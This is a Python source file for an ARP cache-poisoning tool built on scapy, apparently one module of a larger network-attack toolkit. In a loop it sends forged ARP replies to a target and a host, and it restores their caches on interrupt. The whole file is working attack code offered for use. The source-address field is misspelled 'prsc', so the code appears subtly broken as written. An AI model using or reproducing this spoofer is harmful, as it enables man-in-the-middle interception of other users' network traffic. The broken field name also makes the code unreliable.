import sys
import time
import scapy.all as scapy
from rich import print

from resources.services import DeviceInfo

"""
----  TO DO:  ----
def enable_ip_route();
"""

def ScapyArpSpoofer(target, host, verbose):

    def spoofer(target, host):
        packet = scapy.ARP(op=2, pdst=target, hwdst=info.get_mac(target), prsc=host)
        scapy.send(packet, verbose=False)


    def restore_cache(target, host):
        target_mac = info.get_mac(target)
        host_mac = info.get_mac(host)

        packet = scapy.ARP(op=2, pdst=target, hwdst=target_mac, prsc=host, hwsrc=host_mac)
        scapy.send(packet, verbose=False)


    try:
        info = DeviceInfo()
        packets_count = 0

        while True:
            spoofer(target, host)
            spoofer(host, target)
            packets_count = packets_count + 2

            if verbose:
                print(f"[bold green][+][/bold green] Packets sent: [green]{packets_count}[/green]")

            time.sleep(1)
    
    except KeyboardInterrupt:
        restore_cache(target, host)
        restore_cache(host, target)
        print(f"[bold green][+][/bold green] Cache restored.")
        sys.exit()

    except Exception as e:
        print(f"[bold red][!] ERROR: {str(e)}[/bold red]")
        sys.exit(1)



if __name__ == '__main__':
    pass
